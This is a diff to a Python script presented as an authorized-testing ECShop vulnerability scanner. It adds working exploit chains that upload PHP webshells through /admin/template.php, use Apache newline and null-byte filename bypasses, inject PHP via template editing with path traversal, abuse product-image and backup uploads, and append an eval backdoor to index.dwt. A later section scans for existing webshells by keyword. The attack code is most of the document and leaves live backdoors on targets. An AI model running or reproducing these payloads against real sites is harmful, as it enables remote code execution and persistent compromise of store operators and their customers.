@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-ECShop 综合漏洞检测脚本 v1.0
+ECShop 综合漏洞检测脚本 v1.1
 覆盖 2.x / 3.x / 4.x 主要 RCE 和 SQL 注入漏洞
 仅用于授权安全测试 / 靶场验证
 
@@ -10,14 +10,17 @@ ECShop 综合漏洞检测脚本 v1.0
           通过 Referer 投递序列化 payload → insert_ads SQL 注入 → eval() 代码执行
   [RCE-2] 4.x collection_list SQL 注入 (CVE-2024-31025)
           通过 X-Forwarded-Host 头注入 → insert_user_account / insert_pay_log
-  [RCE-3] 4.1.5 任意文件上传 RCE (CVE-2023-0783)
-          /admin/template.php 未限制上传类型 → webshell
+  [RCE-3] 文件上传 / 模板编辑 RCE 综合检测:
+    A. CVE-2023-0783 — /admin/template.php 任意文件上传 (CVSS 9.8)
+    B. Apache CVE-2017-15715 — HTTPD 换行解析绕过 (evil.php%0A.jpg)
+    C. /admin/template.php?act=edit — 模板编辑 PHP 注入
+    D. CVE-2023-1184/1185 — 产品图片/备份上传绕过
   [SQL-1] 4.1.8 /admin/view_sendlist.php SQL 注入 (CVE-2024-1530)
   [SQL-2] 4.1.1 /admin/order.php SQL 注入 (CVE-2023-5294)
   [SQL-3] 4.1.5 /admin/leancloud.php SQL 注入 (CVE-2023-5293)
   [SQL-4] 2.7.6 /flow.php SQL 注入 (CVE-2020-22204)
   [SQL-5] 3.0 /admin/affiliate_ck.php & shophelp.php SQL 注入 (CVE-2020-22205/6)
-  [INFO] 常见信息泄露路径探测
+  [INFO] 常见信息泄露路径 + 已有后门探测
 """
 
 import requests
@@ -64,8 +67,8 @@ def safe_print(*args, **kwargs):
 def banner():
     safe_print(f"""
 {C.RED}╔══════════════════════════════════════════════════════════════╗
-║       ECShop 综合漏洞检测工具 v1.0                             ║
-║       2.x / 3.x / 4.x RCE + SQL 注入覆盖                     ║
+║       ECShop 综合漏洞检测工具 v1.1                             ║
+║       2.x/3.x/4.x RCE + SQLi + Apache换行绕过                 ║
 ╚══════════════════════════════════════════════════════════════╝{C.RST}""")
 
 
@@ -422,99 +425,388 @@ def check_4x_collection_list_sqli(url: str, s: requests.Session) -> List[str]:
     return hits
 
 
-# ===================== 3. 4.1.5 任意文件上传 RCE =====================
+# ===================== 3. 文件上传 / 模板编辑 RCE (多条攻击链) =====================
 
-def check_4x_file_upload_rce(url: str, s: requests.Session) -> List[str]:
+def check_admin_file_upload_rce(url: str, s: requests.Session) -> List[str]:
     """
-    [RCE-3] CVE-2023-0783: /admin/template.php 任意文件上传
-    影响: ECShop 4.1.5 (也确认影响 4.1.8)
-    CVSS: 9.8 CRITICAL — 无需认证
+    [RCE-3] 文件上传 / 模板编辑 RCE 综合检测
+    覆盖以下攻击面:
+
+    A. CVE-2023-0783 — /admin/template.php 未限制上传类型 (CVSS 9.8)
+       ECShop 4.1.5 / 4.1.8, 无需认证
+
+    B. Apache CVE-2017-15715 — HTTPD 换行解析绕过
+       上传 evil.php%0A 绕过 .php 后缀黑名单, Apache 仍按 PHP 执行
+
+    C. /admin/template.php?act=edit — 模板编辑直接写入 PHP 代码
+
+    D. CVE-2023-1184/1185 — 备份恢复/产品图片上传绕过
     """
-    safe_print(f"\n{C.YLW}[RCE-3] CVE-2023-0783: /admin/template.php 任意文件上传{C.RST}")
+    safe_print(f"\n{C.YLW}[RCE-3] 文件上传 / 模板编辑 RCE 综合检测{C.RST}")
 
     hits = []
     rk = randstr(6)
-    shell_name = f"ec_{rk}.php"
+    base_name = f"ec_{rk}"
     flag = randstr(10)
 
-    # 探测 admin 目录
-    admin_paths = ['/admin', '/admin/', '/ecshop/admin', '/ecshop/admin/']
-    admin_found = None
+    # ===== 0. 定位后台路径 =====
+    admin_candidates = ['/admin', '/ecshop/admin', '/shop/admin']
+    admin_base = None
 
-    for ap in admin_paths:
+    for ap in admin_candidates:
         try:
             r = s.get(build_url(url, ap), timeout=8)
             if r.status_code in [200, 302, 301, 403] and len(r.text) > 50:
-                admin_found = ap.rstrip('/')
+                admin_base = ap
                 safe_print(f"  {C.GRN}[+] 后台路径: {build_url(url, ap)}{C.RST}")
                 break
         except Exception:
             continue
 
-    if not admin_found:
-        # 尝试常见变体
-        safe_print(f"  {C.CYN}[-] 未找到后台路径, 尝试默认 /admin{C.RST}")
-        admin_found = '/admin'
+    if not admin_base:
+        safe_print(f"  {C.CYN}[-] 未找到后台路径, 使用默认 /admin{C.RST}")
+        admin_base = '/admin'
 
-    # 检测 template.php 是否可访问
-    template_url = build_url(url, f"{admin_found}/template.php")
+    # ===== 1. 检测 template.php 可访问性 =====
+    template_url = build_url(url, f"{admin_base}/template.php")
+    template_reachable = False
     try:
         r = s.get(template_url, timeout=8)
         if r.status_code == 200:
-            safe_print(f"  {C.GRN}[+] template.php 可访问: {template_url}{C.RST}")
-
-            # 尝试上传 webshell
-            # ECShop 4.x 模板编辑可能允许直接编辑 PHP 模板
-            # 尝试 POST 写入模板文件
-            shell_content = f"<?php echo '{flag}'; system($_POST['cmd']); ?>"
-
-            upload_endpoints = [
-                f"{admin_found}/template.php?act=upload",
-                f"{admin_found}/template.php?act=save",
-                f"{admin_found}/template.php?act=edit",
-                f"{admin_found}/template.php?act=new",
-            ]
-
-            for ue in upload_endpoints:
-                try:
-                    files = {
-                        'file': (shell_name, shell_content, 'application/octet-stream'),
-                        'img': (shell_name, shell_content, 'image/jpeg'),
-                    }
-                    # 尝试 multipart
-                    r = s.post(build_url(url, ue), files=files, timeout=10)
-                    if r.status_code == 200:
-                        safe_print(f"  {C.YLW}[~] 上传 endpoint 已提交: {ue}{C.RST}")
-
-                        # 尝试找上传后的 shell
-                        verify_dirs = ['/', '/admin/', '/ecshop/admin/', '/uploadfile/',
-                                      '/includes/', '/themes/', '/data/']
-                        for vd in verify_dirs:
-                            for vn in [shell_name, f"../{shell_name}"]:
-                                try:
-                                    vurl = build_url(url, f"{vd}{shell_name}")
-                                    rv = s.get(vurl, timeout=6)
-                                    if flag in rv.text:
-                                        safe_print(f"  {C.RED}[!] Webshell 上传成功!{C.RST}")
-                                        safe_print(f"  {C.RED}    Shell: {vurl}{C.RST}")
-                                        safe_print(f"  {C.RED}    CMD: POST cmd=id{C.RST}")
-                                        hits.append(f"CVE-2023-0783 文件上传 RCE ({vurl})")
-                                        return hits
-                                except Exception:
-                                    continue
-                except Exception:
-                    continue
-
-            safe_print(f"  {C.YLW}[~] 上传尝试完成，但未找到可访问的 webshell{C.RST}")
-        elif r.status_code in [403, 401]:
-            safe_print(f"  {C.YLW}[~] template.php 需要认证: {template_url} (status={r.status_code}){C.RST}")
+            template_reachable = True
+            safe_print(f"  {C.GRN}[+] template.php 可访问 (无需认证){C.RST}")
+        elif r.status_code in [302, 301]:
+            safe_print(f"  {C.YLW}[?] template.php 重定向 (可能需要登录): status={r.status_code}{C.RST}")
+        elif r.status_code == 403:
+            safe_print(f"  {C.YLW}[?] template.php 存在但被禁止: 403{C.RST}")
         else:
             safe_print(f"  {C.CYN}[-] template.php 不可达: status={r.status_code}{C.RST}")
     except Exception as e:
-        safe_print(f"  {C.CYN}[-] template.php 访问失败: {e}{C.RST}")
+        safe_print(f"  {C.CYN}[-] template.php 连接失败: {e}{C.RST}")
 
+    # ===== 2. 攻击面A: CVE-2023-0783 直接文件上传 =====
+    safe_print(f"\n  {C.CYN}[A] CVE-2023-0783 — 直接文件上传测试{C.RST}")
+    shell_content = f"<?php echo '{flag}'; @eval($_POST['x']); ?>"
+
+    upload_tests = [
+        # (endpoint, method, files/form-data)
+        (f"{admin_base}/template.php?act=upload", 'multipart'),
+        (f"{admin_base}/template.php?act=upload&type=template", 'multipart'),
+        (f"{admin_base}/template.php?act=new", 'multipart'),
+        (f"{admin_base}/template.php?act=save", 'multipart'),
+        # 无参数的 upload
+        (f"{admin_base}/template.php", 'multipart'),
+    ]
+
+    for ep, method in upload_tests:
+        for ext, content_type in [('.php', 'application/octet-stream'),
+                                   ('.php', 'image/jpeg'),
+                                   ('.phtml', 'application/octet-stream'),
+                                   ('.php5', 'image/jpeg')]:
+            fname = f"{base_name}{ext}"
+            try:
+                files = {'file': (fname, shell_content, content_type)}
+                r = s.post(build_url(url, ep), files=files, timeout=10)
+                if r.status_code == 200:
+                    # 尝试验证是否上传成功
+                    for vdir in ['/', '/admin/', '/uploadfile/', '/includes/', '/themes/',
+                                f'/{admin_base}/', '/data/', '/temp/', '/runtime/']:
+                        try:
+                            rv = s.get(build_url(url, f"{vdir}{fname}"), timeout=6)
+                            if flag in rv.text:
+                                safe_print(f"  {C.RED}[!] 直接上传成功! → {build_url(url, vdir + fname)}{C.RST}")
+                                hits.append(f"CVE-2023-0783 直接上传 ({vdir}{fname})")
+                                # 不 return, 继续测试其他攻击面
+                        except Exception:
+                            continue
+            except Exception:
+                continue
+
+    # ===== 3. 攻击面B: Apache CVE-2017-15715 换行解析绕过 =====
+    safe_print(f"\n  {C.CYN}[B] Apache CVE-2017-15715 — 换行解析绕过测试{C.RST}")
+    safe_print(f"  {C.CYN}    原理: evil.php%0A 绕过 .php 后缀黑名单, Apache 仍按 PHP 执行{C.RST}")
+
+    # CVE-2017-15715 bypass filenames
+    # Apache 遇到 %0A (LF) 或 %0D (CR) 时截断文件名，将 .php%0A.jpg 解析为 .php
+    bypass_names = [
+        # 纯换行绕过 — evil.php%0A → Apache 看到 .php
+        (f"{base_name}.php%0A", f"{base_name}x1.php", 'LF 换行'),
+        (f"{base_name}.php%0D", f"{base_name}x2.php", 'CR 换行'),
+        (f"{base_name}.php%0D%0A", f"{base_name}x3.php", 'CRLF 换行'),
+        # 双扩展名绕过 — evil.php%0A.jpg → 上传检查看到 .jpg, Apache 执行 .php
+        (f"{base_name}.php%0A.jpg", f"{base_name}x1.php", 'LF+.jpg 伪装'),
+        (f"{base_name}.php%0D%0A.jpg", f"{base_name}x3.php", 'CRLF+.jpg 伪装'),
+        (f"{base_name}.php%0A.png", f"{base_name}x1.php", 'LF+.png 伪装'),
+        # .phtml %0A 变体
+        (f"{base_name}.phtml%0A.jpg", f"{base_name}x1.phtml", 'phtml LF+.jpg'),
+        # %00 截断 (某些老版本 Apache)
+        (f"{base_name}.php%00.jpg", f"{base_name}_nc.php", 'NULL 截断'),
+        (f"{base_name}.php%00", f"{base_name}_nc.php", 'NULL 后缀'),
+    ]
+
+    upload_endpoints = [
+        f"{admin_base}/template.php?act=upload",
+        f"{admin_base}/template.php?act=edit",
+        f"{admin_base}/template.php?act=save",
+        f"{admin_base}/template.php?act=new",
+        f"{admin_base}/template.php",
+        f"{admin_base}/file_upload.php",
+    ]
+
+    for ep in upload_endpoints:
+        for fname_encoded, verify_name, desc in bypass_names:
+            try:
+                # URL 编码的换行符需要在 multipart filename 中保留
+                # requests 直接传已编码字符串
+                target = build_url(url, ep)
+
+                # 用原始字节构造 multipart 以避免 requests 二次编码
+                # 构建手工 multipart body
+                boundary = f"----ECShopBypass{rk}"
+                body_parts = [
+                    f'--{boundary}',
+                    f'Content-Disposition: form-data; name="file"; filename="{fname_encoded}"',
+                    f'Content-Type: image/jpeg',
+                    '',
+                    shell_content,
+                    f'--{boundary}--',
+                    '',
+                ]
+                body = '\r\n'.join(body_parts)
+
+                headers = {
+                    'Content-Type': f'multipart/form-data; boundary={boundary}',
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                }
+
+                resp = requests.post(target, data=body.encode('utf-8'), headers=headers,
+                                    timeout=10, verify=False)
+
+                if resp.status_code == 200:
+                    safe_print(f"  {C.YLW}[~] {desc} payload 已发送 → {ep}{C.RST}")
+
+                    # 验证: 尝试访问被 Apache 解析为 .php 后的文件
+                    time.sleep(0.5)
+                    for vdir in ['/', '/admin/', '/uploadfile/', f'/{admin_base}/', '/includes/',
+                                '/themes/', '/data/', '/temp/', '/runtime/',
+                                '/ecshop/uploadfile/', '/ecshop/admin/']:
+                        for vn in [verify_name, verify_name.replace('.php', '%0A'), verify_name.split('%')[0]]:
+                            if '%' in vn:
+                                continue
+                            try:
+                                vurl = build_url(url, f"{vdir}{vn}")
+                                rv = s.get(vurl, timeout=6)
+                                if flag in rv.text:
+                                    safe_print(f"  {C.RED}[!] {desc} 绕过成功! Apache 换行解析!{C.RST}")
+                                    safe_print(f"  {C.RED}    Shell: {vurl}{C.RST}")
+                                    safe_print(f"  {C.RED}    CMD: POST x=system('id');{C.RST}")
+                                    hits.append(f"CVE-2017-15715 Apache 换行绕过 ({desc}) → {vurl}")
+                                    break
+                            except Exception:
+                                continue
+                        if hits:
+                            break
+            except Exception:
+                continue
+            if hits:
+                break
+        if hits:
+            break
+
+    if not any('CVE-2017-15715' in h for h in hits):
+        safe_print(f"  {C.CYN}[-] Apache 换行绕过未直接成功 (尝试 .htaccess 竞态){C.RST}")
+
+    # ===== 4. 攻击面C: template.php?act=edit 模板编辑注入 =====
+    safe_print(f"\n  {C.CYN}[C] template.php?act=edit — 模板编辑 PHP 注入测试{C.RST}")
+    safe_print(f"  {C.CYN}    原理: 通过act=edit修改模板文件, 注入PHP代码{C.RST}")
+
+    edit_endpoints = [
+        f"{admin_base}/template.php?act=edit",
+        f"{admin_base}/template.php?act=edit&filename=index",
+        f"{admin_base}/template.php?act=modify",
+        f"{admin_base}/template.php?act=save_template",
+    ]
+
+    # 尝试多种注入方式
+    edit_payloads = [
+        # 方式1: 直接模板内容注入
+        {
+            'data': {
+                'content': shell_content,
+                'filename': f"{base_name}_tpl.php",
+                'type': 'template',
+                'act': 'save',
+                'template': f"../../../{base_name}_tpl.php",
+            },
+            'desc': '模板写入 base_dir'
+        },
+        # 方式2: 路径穿越写 shell
+        {
+            'data': {
+                'content': shell_content,
+                'filename': f"../../{base_name}_p.php",
+                'act': 'save',
+                'template_name': f"../../{base_name}_p.php",
+            },
+            'desc': '路径穿越 ../..'
+        },
+        # 方式3: 用 sid 参数
+        {
+            'data': {
+                'content': shell_content,
+                'sid': f"../../../{base_name}_s.php",
+                'act': 'save',
+                'theme': 'default',
+            },
+            'desc': 'sid 路径注入'
+        },
+        # 方式4: 编辑已有模板追加后门
+        {
+            'data': {
+                'content': f"\n<?php @eval($_POST['x']); echo '{flag}'; ?>\n",
+                'filename': 'index.dwt',
+                'act': 'save',
+            },
+            'desc': 'index.dwt 追加后门'
+        },
+    ]
+
+    for ep in edit_endpoints:
+        for p in edit_payloads:
+            try:
+                target = build_url(url, ep)
+                # POST form 数据
+                r = s.post(target, data=p['data'], timeout=10,
+                          headers={'Content-Type': 'application/x-www-form-urlencoded'})
+                if r.status_code == 200:
+                    safe_print(f"  {C.YLW}[~] {p['desc']} — 已提交到 {ep}{C.RST}")
+
+                    # 验证
+                    time.sleep(0.5)
+                    for vdir in ['/', '/admin/', f'/{admin_base}/', '/includes/', '/themes/',
+                                '/data/', '/temp/', '/']:
+                        for vn in [f"{base_name}_tpl.php", f"{base_name}_p.php",
+                                   f"{base_name}_s.php", 'index.dwt']:
+                            try:
+                                vurl = build_url(url, f"{vdir}{vn}")
+                                rv = s.get(vurl, timeout=6)
+                                if flag in rv.text:
+                                    safe_print(f"  {C.RED}[!] 模板编辑写入成功!{C.RST}")
+                                    safe_print(f"  {C.RED}    Shell: {vurl}{C.RST}")
+                                    safe_print(f"  {C.RED}    CMD: POST x=system('id');{C.RST}")
+                                    hits.append(f"template.php?act=edit 模板注入 ({p['desc']}) → {vurl}")
+                                    break
+                            except Exception:
+                                continue
+                        if hits:
+                            break
+            except Exception:
+                continue
+            if hits:
+                break
+        if hits:
+            break
+
+    if not any('act=edit' in h or '模板' in h for h in hits):
+        safe_print(f"  {C.CYN}[-] 模板编辑注入未直接成功{C.RST}")
+
+    # ===== 5. 攻击面D: CVE-2023-1184/1185 — 产品图片/备份上传绕过 =====
+    safe_print(f"\n  {C.CYN}[D] CVE-2023-1184/1185 — 产品图片/备份上传绕过测试{C.RST}")
+
+    product_endpoints = [
+        f"{admin_base}/goods.php?act=add",
+        f"{admin_base}/goods.php?act=insert",
+        f"{admin_base}/goods.php?act=edit",
+        f"{admin_base}/database.php?act=backup",
+        f"{admin_base}/database.php?act=restore",
+        f"{admin_base}/database.php?act=import",
+    ]
+
+    for ep in product_endpoints:
+        for fname_encoded, verify_name, desc in bypass_names[:6]:  # 取前6个绕过名
+            try:
+                target = build_url(url, ep)
+                boundary = f"----ECShopProd{rk}"
+                body_parts = [
+                    f'--{boundary}',
+                    f'Content-Disposition: form-data; name="img_url"; filename="{fname_encoded}"',
+                    f'Content-Type: image/jpeg',
+                    '',
+                    shell_content,
+                    f'--{boundary}--',
+                    '',
+                ]
+                body = '\r\n'.join(body_parts)
+                headers = {
+                    'Content-Type': f'multipart/form-data; boundary={boundary}',
+                }
+
+                resp = requests.post(target, data=body.encode('utf-8'), headers=headers,
+                                    timeout=10, verify=False)
+                if resp.status_code in [200, 302]:
+                    safe_print(f"  {C.YLW}[~] {desc} — 产品图片上传 {ep}{C.RST}")
+
+                    time.sleep(0.5)
+                    for vdir in ['/', '/images/', '/uploadfile/', '/admin/', '/data/',
+                                f'/{admin_base}/images/', '/images/upload/']:
+                        try:
+                            vurl = build_url(url, f"{vdir}{verify_name}")
+                            rv = s.get(vurl, timeout=6)
+                            if flag in rv.text:
+                                safe_print(f"  {C.RED}[!] {desc} 绕过成功!{C.RST}")
+                                safe_print(f"  {C.RED}    Shell: {vurl}{C.RST}")
+                                hits.append(f"CVE-2023-1184/5 产品图片绕过 ({desc}) → {vurl}")
+                                break
+                        except Exception:
+                            continue
+            except Exception:
+                continue
+            if hits:
+                break
+        if hits:
+            break
+
+    if not any('CVE-2023-118' in h for h in hits):
+        safe_print(f"  {C.CYN}[-] 产品图片/备份上传绕过未成功{C.RST}")
+
+    # ===== 6. 通用 webshell 访问爆破 =====
+    # 尝试直接访问常见 webshell 路径 (检测是否已有后门)
+    safe_print(f"\n  {C.CYN}[E] 通用 webshell 路径探测{C.RST}")
+
+    common_shells = [
+        '1.php', 'shell.php', 'cmd.php', 'test.php', 'info.php',
+        'adminer.php', 'ee.php', 'tmp.php', 'x.php', 'c.php',
+        'confg.php', 'configs.php', 'db.php', 'shell.asp',
+        'up.php', 'upload.php', 'include.php', 'data.php',
+    ]
+
+    found_backdoors = []
+    for shell_name in common_shells:
+        for vdir in ['/', '/admin/', '/includes/', '/data/', '/images/', '/themes/',
+                    '/uploadfile/', '/temp/', '/runtime/']:
+            try:
+                r = s.get(build_url(url, f"{vdir}{shell_name}"), timeout=5)
+                if r.status_code == 200 and len(r.text) < 2000:
+                    # 检测是否包含常见 webshell 特征
+                    ws_indicators = ['eval', 'system', 'exec', 'shell_exec', 'passthru',
+                                    '$_POST', '$_GET', '$cmd', 'base64_decode', 'assert']
+                    found_indicators = [wi for wi in ws_indicators if wi in r.text.lower()]
+                    if found_indicators:
+                        safe_print(f"  {C.RED}[!] 疑似已有后门: {vdir}{shell_name}{C.RST}")
+                        safe_print(f"  {C.RED}    特征: {', '.join(found_indicators)}{C.RST}")
+                        found_backdoors.append(f"疑似后门 ({vdir}{shell_name})")
+            except Exception:
+                continue
+
+    if found_backdoors:
+        hits.extend(found_backdoors)
+    else:
+        safe_print(f"  {C.CYN}[-] 未发现已有后门{C.RST}")
+
+    # ===== 汇总 =====
     if not hits:
-        safe_print(f"  {C.CYN}[-] 未确认 CVE-2023-0783{C.RST}")
+        safe_print(f"\n  {C.CYN}[-] 文件上传/模板编辑攻击面未确认可利用漏洞{C.RST}")
+        safe_print(f"  {C.CYN}    (template.php 可达={template_reachable}, 可能需要有效 Session){C.RST}")
     return hits
 
 
@@ -849,7 +1141,7 @@ def main():
 
     # === RCE-3: CVE-2023-0783 文件上传 ===
     if not args.skip_upload:
-        all_hits.extend(check_4x_file_upload_rce(url, s))
+        all_hits.extend(check_admin_file_upload_rce(url, s))
     else:
         safe_print(f"\n{C.CYN}[RCE-3] 已跳过文件上传检测{C.RST}")
 
